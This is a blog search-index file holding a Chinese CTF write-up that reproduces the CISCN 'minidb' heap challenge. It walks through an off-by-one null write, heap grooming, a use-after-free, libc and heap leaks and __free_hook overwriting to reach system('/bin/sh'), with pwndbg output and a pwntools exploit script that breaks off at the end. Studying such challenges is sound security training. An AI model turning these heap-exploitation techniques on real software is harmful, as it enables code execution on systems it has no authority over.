<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>ciscn_minidb复现</title>
      <link href="/2023/08/01/ciscn-minidb-fu-xian/ciscn-minidb-fu-xian/"/>
      <url>/2023/08/01/ciscn-minidb-fu-xian/ciscn-minidb-fu-xian/</url>
      
        <content type="html"><![CDATA[<p>就是说在现场没写不出来比赛完还是写不出来（），看了<code>wp</code>和解析终于看懂了呜呜</p><p>数据库堆题，保护全开，漏洞点如下</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">if ( a1 )  &#123;    printf(&quot;Input the key: &quot;);    __isoc99_scanf(&quot;%ld&quot;, &amp;v3);    ptr &#x3D; sub_168D(a1, v3, 0LL);    if ( ptr )    &#123;      printf(&quot;Input the new value: &quot;);      __isoc99_scanf(&quot;%255s&quot;, value);      len &#x3D; strlen(value);      *(&amp;ptr-&gt;value + len) &#x3D; 0;                 &#x2F;&#x2F; strlen &lt;&#x3D;255 &amp;&amp; oob write \x00       if ( (a1-&gt;type &#x3D;&#x3D; 1 || a1-&gt;type &#x3D;&#x3D; 2) &amp;&amp; len &gt; 0x7F || (a1-&gt;type &#x3D;&#x3D; 3 || a1-&gt;type &#x3D;&#x3D; 4) &amp;&amp; len &gt; 0xFF )      &#123;        puts(&quot;\x1B[31m\x1B[1m[x] The length of new value is TOOOOOO LOOOOONG!\x1B[0m&quot;);      &#125;      else      &#123;        memcpy(&amp;ptr-&gt;value, value, len);        *(&amp;ptr-&gt;value + len) &#x3D; 0;                      puts(&quot;[+] Succesfully update the value of specific key!&quot;);      &#125;    &#125;    else    &#123;      puts(&quot;\x1B[31m\x1B[1m[x] Key NOT FOUND!\x1B[0m&quot;);    &#125;  &#125;  else  &#123;    puts(&quot;\x1B[31m\x1B[1m[x] Runtime error! No database provided!\x1B[0m&quot;);  &#125;  return __readfsqword(0x28u) ^ v6;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>虽然限制了在不同类型下的大小，但是在判断大小之前就会将最后一位赋为<code>0</code>，这里可以实现从该堆线下任意一个字节改为<code>0</code>，接下来开始构造堆</p><p>创建一个数据库与三个键值对，目的是在后续将下一个堆<code>name</code>地址末尾改成<code>0</code>时刚好在一个堆上</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">add_db<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span>use<span class="token punctuation">(</span><span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heapAllocated chunk | PREV_INUSEAddr: 0x558fca8d1000Size: 0x291Allocated chunk | PREV_INUSEAddr: 0x558fca8d1290Size: 0x821Allocated chunk | PREV_INUSEAddr: 0x558fca8d1ab0Size: 0x21Allocated chunk | PREV_INUSEAddr: 0x558fca8d1ad0Size: 0xa1Allocated chunk | PREV_INUSEAddr: 0x558fca8d1b70Size: 0xa1Allocated chunk | PREV_INUSEAddr: 0x558fca8d1c10Size: 0xa1Top chunk | PREV_INUSEAddr: 0x558fca8d1cb0Size: 0x20351<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>再创建一个数据库之后用第一个数据库创建两个键值对并删除第二个键值对和第二个数据库，这样再次申请数据库时就可以让它的<code>name</code>落在这个堆</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">add_db<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">b'b'</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span>use<span class="token punctuation">(</span><span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>out<span class="token punctuation">(</span><span class="token punctuation">)</span>delete_db<span class="token punctuation">(</span><span class="token string">b'b'</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heapAllocated chunk | PREV_INUSEAddr: 0x55b60aa00000Size: 0x291Allocated chunk | PREV_INUSEAddr: 0x55b60aa00290Size: 0x821Allocated chunk | PREV_INUSEAddr: 0x55b60aa00ab0Size: 0x21Allocated chunk | PREV_INUSEAddr: 0x55b60aa00ad0Size: 0xa1Allocated chunk | PREV_INUSEAddr: 0x55b60aa00b70Size: 0xa1Allocated chunk | PREV_INUSEAddr: 0x55b60aa00c10Size: 0xa1Free chunk (unsortedbin) | PREV_INUSEAddr: 0x55b60aa00cb0Size: 0x821fd: 0x7fd935e27be0bk: 0x7fd935e27be0Free chunk (tcache)Addr: 0x55b60aa014d0Size: 0x20fd: 0x00Allocated chunk | PREV_INUSEAddr: 0x55b60aa014f0Size: 0xa1Free chunk (tcache) | PREV_INUSEAddr: 0x55b60aa01590Size: 0xa1fd: 0x00Top chunk | PREV_INUSEAddr: 0x55b60aa01630Size: 0x1f9d1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>再次申请一个数据库且大小在<code>0x90</code>，此时会用到刚刚删除的数据库的管理和第一个数据库被释放掉的堆，刚好将第三个数据库的<code>name</code>地址低位改成<code>\x00</code>后落在第一个数据库的第四个堆上</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">add_db<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">b'b'</span> <span class="token operator">*</span> <span class="token number">0x90</span><span class="token punctuation">)</span>use<span class="token punctuation">(</span><span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x98</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heapAllocated chunk | PREV_INUSEAddr: 0x55ecd0d2f000Size: 0x291Allocated chunk | PREV_INUSEAddr: 0x55ecd0d2f290Size: 0x821Allocated chunk | PREV_INUSEAddr: 0x55ecd0d2fab0Size: 0x21Allocated chunk | PREV_INUSEAddr: 0x55ecd0d2fad0Size: 0xa1Allocated chunk | PREV_INUSEAddr: 0x55ecd0d2fb70Size: 0xa1Allocated chunk | PREV_INUSEAddr: 0x55ecd0d2fc10Size: 0xa1Allocated chunk | PREV_INUSEAddr: 0x55ecd0d2fcb0Size: 0x821Free chunk (tcache) | PREV_INUSEAddr: 0x55ecd0d304d0Size: 0x21fd: 0x00Allocated chunk | PREV_INUSEAddr: 0x55ecd0d304f0Size: 0xa1Allocated chunk | PREV_INUSEAddr: 0x55ecd0d30590Size: 0xa1Top chunk | PREV_INUSEAddr: 0x55ecd0d30630Size: 0x1f9d1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; x&#x2F;10gx 0x55ecd0d2fcb00x55ecd0d2fcb0: 0x0000000000000000      0x00000000000008210x55ecd0d2fcc0: 0x0000000000000002      0x000055ecd0d30500<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>此时释放掉第一个数据库的第四个堆并不会清除第三个数据库中的<code>name</code>地址，造成<code>UAF</code>，先填充<code>tcache</code>再释放掉这个堆，通过数据库名称列表泄露<code>libc</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    add<span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    delete<span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>out<span class="token punctuation">(</span><span class="token punctuation">)</span>show_db<span class="token punctuation">(</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x1ecbe0</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./2.31/libc-2.31.so'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">[DEBUG] Received 0xf8 bytes:    00000000  5b 2a 5d 20  59 6f 75 20  68 61 76 65  20 32 20 64  │[*] │You │have│ 2 d│    00000010  61 74 61 62  61 73 65 20  6e 6f 77 2e  0a 46 6f 6c  │atab│ase │now.│·Fol│    00000020  6c 6f 77 69  6e 67 20 69  73 20 79 6f  75 72 20 64  │lowi│ng i│s yo│ur d│    00000030  61 74 61 62  73 65 73 3a  0a 0a 09 61  61 61 61 61  │atab│ses:│···a│aaaa│    00000040  61 61 61 0a  09 e0 1b 5c  41 a3 7f 0a  0a 43 68 6f  │aaa·│···\│A···│·Cho│    00000050  6f 73 65 20  79 6f 75 72  20 63 6f 6d  6d 61 6e 64  │ose │your│ com│mand│    00000060  3a 0a 0a 31  2e 20 43 72  65 61 74 65  20 61 20 6e  │:··1│. Cr│eate│ a n│    00000070  65 77 20 64  61 74 61 62  61 73 65 2e  0a 32 2e 20  │ew d│atab│ase.│·2. │    00000080  55 73 65 20  61 20 64 61  74 61 62 61  73 65 2e 0a  │Use │a da│taba│se.·│    00000090  33 2e 20 44  65 6c 65 74  65 20 61 20  64 61 74 61  │3. D│elet│e a │data│    000000a0  62 61 73 65  2e 0a 34 2e  20 4c 69 73  74 20 74 68  │base│.·4.│ Lis│t th│    000000b0  65 20 64 61  74 61 62 61  73 65 73 2e  0a 35 2e 20  │e da│taba│ses.│·5. │    000000c0  43 68 61 6e  67 65 20 74  68 65 20 6e  61 6d 65 20  │Chan│ge t│he n│ame │    000000d0  6f 66 20 61  20 64 61 74  61 62 61 73  65 2e 0a 36  │of a│ dat│abas│e.·6│    000000e0  36 36 2e 20  45 78 69 74  2e 0a 0a 59  6f 75 72 20  │66. │Exit│.··Y│our │    000000f0  63 68 6f 69  63 65 3a 20                            │choi│ce: │    000000f8<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>再将释放的堆全部申请回来，单独释放一个堆和<code>name</code>中指向的堆中指向的堆，以此泄露堆地址，因为后续改数据库名称时需要<code>name</code>中的内容</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">use<span class="token punctuation">(</span><span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    add<span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span>out<span class="token punctuation">(</span><span class="token punctuation">)</span>show_db<span class="token punctuation">(</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">8</span> <span class="token operator">+</span> <span class="token string">b'\n'</span> <span class="token operator">+</span> <span class="token string">b'\t'</span><span class="token punctuation">)</span>heap <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>改第三个数据库的名称为<code>free_hook</code>，此时修改的堆实际上已经被释放，因此能够改到<code>tcache</code>链表，需要注意的是数据路名称大小要是<code>0x90</code>，且改<code>free_hook</code>的时候<code>system</code>地址只能在后面否则会截断，因此要写入的地址是<code>free_hook - 0x88</code>，写入成功在创建一个<code>/bin/sh</code>并释放即可‘</p><p>exp：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span><span class="token comment">#context.terminal = ['tmux','splitw','-h']</span>debug <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"Your choice: "</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b"1"</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"Input the key: "</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"Input the value: "</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"Your choice: "</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b"2"</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"Input the key: "</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"Your choice: "</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b"3"</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"Input the key: "</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"Input the new value: "</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"Your choice: "</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b"4"</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"Input the key: "</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">out</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"Your choice: "</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b"666"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add_db</span><span class="token punctuation">(</span><span class="token builtin">type</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"Your choice: "</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b"1"</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"Please input the name of database: "</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>name<span class="token punctuation">)</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"Please input the type of database: "</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">type</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">use</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"Your choice: "</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b"2"</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"Please input the name of database: "</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete_db</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"Your choice: "</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b"3"</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"Please input the name of database: "</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show_db</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"Your choice: "</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b"4"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit_db</span><span class="token punctuation">(</span>orig_name<span class="token punctuation">,</span> new_name<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"Your choice: "</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b"5"</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"Please input the name of database: "</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>orig_name<span class="token punctuation">)</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"Please input the new name for database: "</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>new_name<span class="token punctuation">)</span>add_db<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span>use<span class="token punctuation">(</span><span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>out<span class="token punctuation">(</span><span class="token punctuation">)</span>add_db<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">b'b'</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span>use<span class="token punctuation">(</span><span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>out<span class="token punctuation">(</span><span class="token punctuation">)</span>delete_db<span class="token punctuation">(</span><span class="token string">b'b'</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span>add_db<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">b'b'</span> <span class="token operator">*</span> <span class="token number">0x90</span><span class="token punctuation">)</span>use<span class="token punctuation">(</span><span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x98</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    add<span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    delete<span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>out<span class="token punctuation">(</span><span class="token punctuation">)</span>show_db<span class="token punctuation">(</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x1ecbe0</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./2.31/libc-2.31.so'</span><span class="token punctuation">)</span>free_hook <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span>system <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>use<span class="token punctuation">(</span><span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    add<span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span>out<span class="token punctuation">(</span><span class="token punctuation">)</span>show_db<span class="token punctuation">(</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">8</span> <span class="token operator">+</span> <span class="token string">b'\n'</span> <span class="token operator">+</span> <span class="token string">b'\t'</span><span class="token punctuation">)</span>heap <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token 